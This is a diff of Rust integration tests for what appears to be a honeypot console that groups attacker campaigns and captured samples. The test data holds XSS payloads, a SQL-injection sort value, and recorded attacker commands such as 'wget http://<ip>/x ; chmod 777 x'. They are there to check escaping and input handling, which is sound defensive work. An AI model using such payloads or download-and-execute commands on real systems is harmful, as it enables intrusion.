@@ -276,28 +276,34 @@ async fn the_campaign_list_shows_each_campaign_with_its_hosts_and_activity(pool:
     assert_eq!(status, StatusCode::OK);
     let sample = campaign_id(&pool, "sample").await;
     let sequence = campaign_id(&pool, "command_sequence").await;
+    // The same-sample campaign is not a row; its sample is the command sequence's "delivers".
     assert!(
-        page.contains(&format!("href=\"/campaigns/{sample}\"")),
+        !page.contains(&format!("href=\"/campaigns/{sample}\"")),
         "{page}"
     );
     assert!(page.contains(&format!("href=\"/campaigns/{sequence}\"")));
-    assert!(page.contains(&format!("sample {} (w.sh)", &sha[..12])));
+    assert!(!page.contains(&format!("sample {} (w.sh)", &sha[..12])));
     assert!(
-        page.contains(
-            "3 commands: uname -a ; cat /proc/cpuinfo | grep name ; cd /tmp; cat &gt; w.sh"
-        ),
+        page.contains(">uname -a ; cat /proc/cpuinfo | grep name ; cd /tmp; cat &gt; w.sh</a>"),
         "{page}"
     );
-    // The sample campaign's five hosts, all seen today, make one full-height bar.
-    assert!(page.contains("<td class=\"count\">5</td>"));
     assert!(
-        page.contains(&format!("<title>{}: 5</title>", t0().date_naive())),
+        page.contains("<span class=\"dim\">3 commands</span>"),
+        "{page}"
+    );
+    // The command sequence's three hosts, all seen today, make one full-height bar.
+    assert!(
+        page.contains("3<span class=\"c-unit\"> hosts</span>"),
+        "{page}"
+    );
+    assert!(
+        page.contains(&format!("<title>{}: 3</title>", t0().date_naive())),
         "{page}"
     );
     assert!(page.contains(&format!("href=\"/samples/{sha}\"")));
 
-    let (_, filtered) = console.get("/campaigns?kind=scanner").await;
-    assert!(!filtered.contains(&format!("href=\"/campaigns/{sample}\"")));
+    let (_, filtered) = console.get("/campaigns?kind=scan").await;
+    assert!(!filtered.contains(&format!("href=\"/campaigns/{sequence}\"")));
     assert!(filtered.contains("no campaigns of this kind yet"));
 }
 
@@ -311,6 +317,14 @@ async fn attacker_text_is_rendered_escaped_and_never_as_a_link(pool: PgPool) {
         .execute(&pool)
         .await
         .unwrap();
+    // The list shows the command sequence's label in a link, its `title` and a cell.
+    sqlx::query(
+        "UPDATE campaign SET label = '9 commands: <script>alert(1)</script> \"><img src=x onerror=alert(3)>' \
+         WHERE kind = 'command_sequence'",
+    )
+    .execute(&pool)
+    .await
+    .unwrap();
     sqlx::query(
         "INSERT INTO ioc (kind, value, detail, artifact_sha256, first_seen, last_seen) \
          VALUES ('url', 'http://198.51.100.9/\"><img src=x onerror=alert(2)>', '<b>bold</b>', $1, now(), now())",
@@ -325,8 +339,19 @@ async fn attacker_text_is_rendered_escaped_and_never_as_a_link(pool: PgPool) {
         .await
         .unwrap();
     let console = Console::new(pool.clone());
+    let (_, list) = console.get("/campaigns").await;
+    assert!(
+        list.contains(
+            "&lt;script&gt;alert(1)&lt;/script&gt; &quot;&gt;&lt;img src=x onerror=alert(3)&gt;"
+        ),
+        "{list}"
+    );
+    assert!(!list.contains("<img src=x onerror=alert(3)"), "{list}");
+    assert!(!list.contains("\"><img"), "{list}");
     for uri in [
         "/campaigns".to_string(),
+        "/campaigns?single=1".to_string(),
+        "/samples".to_string(),
         format!("/campaigns/{sample}"),
         format!("/samples/{sha}"),
     ] {
@@ -581,13 +606,47 @@ async fn queue_ip_and_samples_pages_link_to_the_campaign(pool: PgPool) {
     );
     assert!(ip_page.contains("5 hosts"));
 
+    // A second file in the spool that nothing ever referenced.
+    let lone = b"#!/bin/sh\necho nobody sent this\n";
+    let lone_sha: String = Sha256::digest(lone)
+        .iter()
+        .map(|b| format!("{b:02x}"))
+        .collect();
+    std::fs::write(root.path().join("ssh").join(&lone_sha), lone).unwrap();
+    let sequence = campaign_id(&pool, "command_sequence").await;
+
     let (status, samples) = console.get("/samples").await;
     assert_eq!(status, StatusCode::OK);
-    assert!(
-        samples.contains(&format!("<a href=\"/campaigns/{sample}\">5 hosts</a>")),
-        "{samples}"
-    );
     assert!(samples.contains(&format!("href=\"/samples/{sha}\"")));
+    let row = between(&samples, &format!("href=\"/samples/{sha}\">"), "</tr>");
+    assert!(
+        row.contains(&format!(
+            "<a href=\"/campaigns/{sample}\">5<span class=\"c-unit\"> hosts</span></a>"
+        )),
+        "host count links the sample's own campaign: {row}"
+    );
+    assert!(
+        row.contains(&format!("<title>{}: 5</title>", t0().date_naive())),
+        "the hosts-per-day sparkline: {row}"
+    );
+    assert!(row.contains("UTC"), "the Active cell: {row}");
+    assert!(
+        row.contains(&format!("<a href=\"/campaigns/{sequence}\""))
+            && row.contains(&format!(">campaign {sequence}</a>")),
+        "delivered by the command sequence that uploaded it: {row}"
+    );
+    // A file nobody linked has no host count, no activity and no campaign.
+    let lone_row = between(&samples, &format!("href=\"/samples/{lone_sha}\">"), "</tr>");
+    assert!(lone_row.contains("not linked"), "{lone_row}");
+    assert!(!lone_row.contains("/campaigns/"), "{lone_row}");
+    assert!(!lone_row.contains("<svg"), "{lone_row}");
+    assert!(
+        samples.find(&format!("href=\"/samples/{sha}\">")).unwrap()
+            < samples
+                .find(&format!("href=\"/samples/{lone_sha}\">"))
+                .unwrap(),
+        "the most widely delivered file sorts first"
+    );
 
     let (status, detail) = console.get(&format!("/samples/{sha}")).await;
     assert_eq!(status, StatusCode::OK);
@@ -943,4 +1002,375 @@ async fn the_active_cell_shows_a_clock_range_within_a_day_and_a_length_across_da
             "{key}"
         );
     }
+}
+
+/// A campaign row written directly, for the list tests that need a chosen shape (host count,
+/// dates, class) rather than whatever the indexer made of a ledger. `label` is stored as the
+/// indexer would store it, `{count}: {opening}`.
+async fn insert_campaign(
+    pool: &PgPool,
+    kind: &str,
+    label: &str,
+    members: i32,
+    first_hours_ago: i64,
+    last_hours_ago: i64,
+) -> i64 {
+    let opening = label.split_once(": ").map_or(label, |(_, o)| o);
+    sqlx::query_scalar(
+        "INSERT INTO campaign (kind, key, label, representative, rep_event_id, first_seen, \
+                               last_seen, member_count, sightings) \
+         VALUES ($1, $2, $3, jsonb_build_object('opening', $4::text), 1, \
+                 now() - make_interval(hours => $5::int), now() - make_interval(hours => $6::int), \
+                 $7, $7) RETURNING id",
+    )
+    .bind(kind)
+    .bind(format!("key-{label}"))
+    .bind(label)
+    .bind(opening)
+    .bind(first_hours_ago as i32)
+    .bind(last_hours_ago as i32)
+    .bind(members)
+    .fetch_one(pool)
+    .await
+    .unwrap()
+}
+
+fn position(page: &str, needle: &str) -> usize {
+    page.find(needle)
+        .unwrap_or_else(|| panic!("`{needle}` not in page: {page}"))
+}
+
+#[sqlx::test(migrations = false)]
+async fn the_list_sorts_by_hosts_by_default_and_by_dates_on_request(pool: PgPool) {
+    migrate(&pool).await;
+    // (hosts, first seen, last seen) in hours ago: every sort key gives a different order.
+    for (name, hosts, first, last) in [
+        ("aaa", 2, 3, 1),
+        ("bbb", 5, 60, 50),
+        ("ccc", 5, 20, 5),
+        ("ddd", 3, 100, 2),
+    ] {
+        insert_campaign(
+            &pool,
+            "command_sequence",
+            &format!("4 commands: {name}"),
+            hosts,
+            first,
+            last,
+        )
+        .await;
+    }
+    let console = Console::new(pool.clone());
+    let order = |page: &str| -> Vec<&'static str> {
+        let mut seen: Vec<(usize, &'static str)> = ["aaa", "bbb", "ccc", "ddd"]
+            .iter()
+            .map(|n| (position(page, &format!(">{n}</a>")), *n))
+            .collect();
+        seen.sort();
+        seen.into_iter().map(|(_, n)| n).collect()
+    };
+    let (_, page) = console.get("/campaigns").await;
+    assert_eq!(
+        order(&page),
+        ["ccc", "bbb", "ddd", "aaa"],
+        "hosts, then last seen"
+    );
+    assert!(
+        page.contains("<a href=\"/campaigns?sort=hosts\" class=\"active\">hosts</a>"),
+        "{page}"
+    );
+    let (_, page) = console.get("/campaigns?sort=last_seen").await;
+    assert_eq!(order(&page), ["aaa", "ddd", "ccc", "bbb"]);
+    let (_, page) = console.get("/campaigns?sort=first_seen").await;
+    assert_eq!(order(&page), ["aaa", "ccc", "bbb", "ddd"]);
+    // An unknown key falls back to hosts rather than reaching the query.
+    let (status, page) = console
+        .get("/campaigns?sort=1%3BDROP%20TABLE%20campaign")
+        .await;
+    assert_eq!(status, StatusCode::OK);
+    assert_eq!(order(&page), ["ccc", "bbb", "ddd", "aaa"]);
+}
+
+#[sqlx::test(migrations = false)]
+async fn single_host_groups_are_hidden_until_the_toggle_is_used(pool: PgPool) {
+    migrate(&pool).await;
+    insert_campaign(&pool, "command_sequence", "4 commands: multi one", 4, 5, 1).await;
+    insert_campaign(&pool, "command_sequence", "4 commands: lonely one", 1, 5, 1).await;
+    insert_campaign(&pool, "command_sequence", "4 commands: lonely two", 1, 6, 2).await;
+    insert_campaign(&pool, "scanner", "multi-service scan: lonely scan", 1, 6, 2).await;
+    let console = Console::new(pool.clone());
+
+    let (_, page) = console.get("/campaigns").await;
+    assert!(page.contains(">multi one</a>"), "{page}");
+    assert!(
+        !page.contains("lonely"),
+        "single-host groups are hidden by default: {page}"
+    );
+    assert!(
+        page.contains("Campaigns <span class=\"dim\">(1)</span>"),
+        "{page}"
+    );
+    assert!(
+        page.contains(">show single-host groups (3)</a>"),
+        "the toggle counts what it hides: {page}"
+    );
+    assert!(
+        page.contains("href=\"/campaigns?sort=hosts&amp;single=1\""),
+        "{page}"
+    );
+
+    let (_, page) = console.get("/campaigns?single=1").await;
+    for name in ["multi one", "lonely one", "lonely two", "lonely scan"] {
+        assert!(page.contains(&format!(">{name}</a>")), "{name}: {page}");
+    }
+    assert!(
+        page.contains("Campaigns <span class=\"dim\">(4)</span>"),
+        "{page}"
+    );
+    assert!(page.contains(">single-host groups shown</a>"), "{page}");
+    // The tabs and the sort links keep the choice.
+    assert!(
+        page.contains("href=\"/campaigns?kind=scan&amp;sort=hosts&amp;single=1\""),
+        "{page}"
+    );
+
+    // The count follows the tab: one hidden group among the scans.
+    let (_, page) = console.get("/campaigns?kind=scan").await;
+    assert!(page.contains(">show single-host groups (1)</a>"), "{page}");
+    assert!(
+        page.contains("no campaigns of this kind with more than one host yet"),
+        "{page}"
+    );
+    let (_, page) = console.get("/campaigns?kind=scan&single=1").await;
+    assert!(page.contains(">lonely scan</a>"), "{page}");
+}
+
+#[sqlx::test(migrations = false)]
+async fn the_same_sample_kind_is_not_listed_but_its_pages_and_links_still_work(pool: PgPool) {
+    migrate(&pool).await;
+    let sha = seed(&pool, b"#!/bin/sh\necho kept off the list\n").await;
+    for ip in ["192.0.2.1", "192.0.2.2"] {
+        pend(&pool, ip).await;
+    }
+    let sample = campaign_id(&pool, "sample").await;
+    let console = Console::new(pool.clone());
+
+    for uri in [
+        "/campaigns",
+        "/campaigns?single=1",
+        "/campaigns?kind=sample",
+        "/campaigns?kind=behaviour",
+    ] {
+        let (status, page) = console.get(uri).await;
+        assert_eq!(status, StatusCode::OK, "{uri}");
+        assert!(
+            !page.contains(&format!("href=\"/campaigns/{sample}\"")),
+            "{uri} lists the same-sample campaign: {page}"
+        );
+        assert!(!page.contains("same sample"), "{uri}: {page}");
+    }
+    // Its own page, its approval, the queue's group link and the Samples page still resolve.
+    let (status, detail) = console.get(&format!("/campaigns/{sample}")).await;
+    assert_eq!(status, StatusCode::OK);
+    assert!(detail.contains("same sample campaign"), "{detail}");
+    let (status, _) = console.get(&format!("/campaigns/{sample}/approve")).await;
+    assert_eq!(status, StatusCode::OK);
+    let (_, queue) = console.get("/queue").await;
+    let link = format!("<a href=\"/campaigns/{sample}\">campaign {sample}</a>");
+    assert!(queue.contains(&link), "{queue}");
+    let (status, _) = console.get(&format!("/samples/{sha}")).await;
+    assert_eq!(status, StatusCode::OK);
+}
+
+#[sqlx::test(migrations = false)]
+async fn labels_split_into_commands_and_range_and_each_class_has_its_tab(pool: PgPool) {
+    migrate(&pool).await;
+    let cmd = insert_campaign(
+        &pool,
+        "command_sequence",
+        "4-16 commands: wget http://<ip>/x ; chmod 777 x",
+        3,
+        5,
+        1,
+    )
+    .await;
+    let http = insert_campaign(
+        &pool,
+        "command_sequence",
+        "6 commands: http request sent to a shell port",
+        3,
+        5,
+        1,
+    )
+    .await;
+    let login = insert_campaign(
+        &pool,
+        "command_sequence",
+        "5-8 commands: shell entry only",
+        3,
+        5,
+        1,
+    )
+    .await;
+    let scan = insert_campaign(
+        &pool,
+        "scanner",
+        "multi-service scan: ssh, telnet, mqtt",
+        3,
+        5,
+        1,
+    )
+    .await;
+    let console = Console::new(pool.clone());
+
+    let (_, page) = console.get("/campaigns").await;
+    let row = between(&page, &format!("href=\"/campaigns/{cmd}\""), "</tr>");
+    assert!(
+        row.contains(">wget http://&lt;ip&gt;/x ; chmod 777 x</a>"),
+        "{row}"
+    );
+    assert!(
+        row.contains("<span class=\"dim\">4-16 commands</span>"),
+        "{row}"
+    );
+    assert!(
+        !row.contains("4-16 commands:"),
+        "the range is secondary text, not a prefix: {row}"
+    );
+    assert!(
+        row.contains("title=\"wget http://&lt;ip&gt;/x ; chmod 777 x\""),
+        "full text in the title: {row}"
+    );
+    assert!(
+        row.contains("<span class=\"rule rule--commands\">commands</span>"),
+        "{row}"
+    );
+    let scan_row = between(&page, &format!("href=\"/campaigns/{scan}\""), "</tr>");
+    assert!(scan_row.contains(">ssh, telnet, mqtt</a>"), "{scan_row}");
+    assert!(!scan_row.contains("commands</span>"), "{scan_row}");
+
+    for (kind, only, others) in [
+        ("behaviour", cmd, [http, login, scan]),
+        ("http", http, [cmd, login, scan]),
+        ("login", login, [cmd, http, scan]),
+        ("scan", scan, [cmd, http, login]),
+    ] {
+        let (_, page) = console.get(&format!("/campaigns?kind={kind}")).await;
+        assert!(
+            page.contains(&format!("href=\"/campaigns/{only}\"")),
+            "{kind}: {page}"
+        );
+        for other in others {
+            assert!(
+                !page.contains(&format!("href=\"/campaigns/{other}\"")),
+                "{kind} lists {other}: {page}"
+            );
+        }
+    }
+}
+
+#[sqlx::test(migrations = false)]
+async fn delivers_shows_the_sample_count_and_the_first_sample(pool: PgPool) {
+    migrate(&pool).await;
+    let sha = seed(&pool, b"#!/bin/sh\necho one sample\n").await;
+    let sequence = campaign_id(&pool, "command_sequence").await;
+    let console = Console::new(pool.clone());
+    let (_, page) = console.get("/campaigns").await;
+    let row = between(&page, &format!("href=\"/campaigns/{sequence}\""), "</tr>");
+    assert!(row.contains(&format!("href=\"/samples/{sha}\"")), "{row}");
+    assert!(row.contains(&format!(">{}</a>", &sha[..12])), "{row}");
+    assert!(!row.contains("more</span>"), "one sample, no count: {row}");
+
+    // Two more linked samples: the first (by digest) is named, the rest are counted.
+    for filler in ['f', 'e'] {
+        sqlx::query("INSERT INTO campaign_sample (campaign_id, sha256) VALUES ($1, $2)")
+            .bind(sequence)
+            .bind(filler.to_string().repeat(64))
+            .execute(&pool)
+            .await
+            .unwrap();
+    }
+    let (_, page) = console.get("/campaigns").await;
+    let row = between(&page, &format!("href=\"/campaigns/{sequence}\""), "</tr>");
+    assert!(row.contains("+2 more</span>"), "{row}");
+    assert_eq!(
+        row.matches("href=\"/samples/").count(),
+        1,
+        "one link, not a row of hashes: {row}"
+    );
+}
+
+#[sqlx::test(migrations = false)]
+async fn the_ip_page_names_a_sample_captured_through_another_address_report(pool: PgPool) {
+    migrate(&pool).await;
+    let url = "http://203.0.113.91/dl/payload.bin";
+    let body = b"fetched payload";
+    let digest = Sha256::digest(body).to_vec();
+    let sha: String = digest.iter().map(|b| format!("{b:02x}")).collect();
+    for (ip, hours) in [("192.0.2.31", 26), ("192.0.2.32", 5)] {
+        append(
+            &pool,
+            ip,
+            "ssh",
+            SignalType::HoneypotFileDownload,
+            Utc::now() - Duration::hours(hours),
+            serde_json::json!({ "url": url }),
+            Some(Uuid::now_v7()),
+        )
+        .await;
+    }
+    append(
+        &pool,
+        "192.0.2.33",
+        "ssh",
+        SignalType::HoneypotConnection,
+        Utc::now(),
+        serde_json::json!({}),
+        None,
+    )
+    .await;
+    sqlx::query(
+        "INSERT INTO fetch_attempt (url_hash, url, host, scheme, source_ip, status, sha256, bytes, \
+                                    last_attempt) \
+         VALUES ($1, $2, '203.0.113.91', 'http', '192.0.2.31'::inet, 'success', $3, 15, now())",
+    )
+    .bind(Sha256::digest(url.as_bytes()).to_vec())
+    .bind(url)
+    .bind(&digest)
+    .execute(&pool)
+    .await
+    .unwrap();
+    let console = Console::new(pool.clone());
+
+    // The first reporter owns the capture: the panel lists it and says nothing extra.
+    let (_, first) = console.get("/ip/192.0.2.31").await;
+    assert!(
+        !first.contains("first reported by another address"),
+        "{first}"
+    );
+    assert!(
+        !first.contains("no samples linked to this address"),
+        "{first}"
+    );
+    // The later reporter's panel must not claim there is nothing while the URL table shows it.
+    let (_, later) = console.get("/ip/192.0.2.32").await;
+    assert!(
+        later.contains("1 sample via a URL first reported by another address"),
+        "{later}"
+    );
+    assert!(
+        later.contains(&format!("href=\"/samples/{sha}\"")),
+        "{later}"
+    );
+    assert!(
+        !later.contains("no samples linked to this address"),
+        "{later}"
+    );
+    // An address with no download at all still says so.
+    let (_, none) = console.get("/ip/192.0.2.33").await;
+    assert!(none.contains("no samples linked to this address"), "{none}");
+    assert!(
+        !none.contains("first reported by another address"),
+        "{none}"
+    );
 }
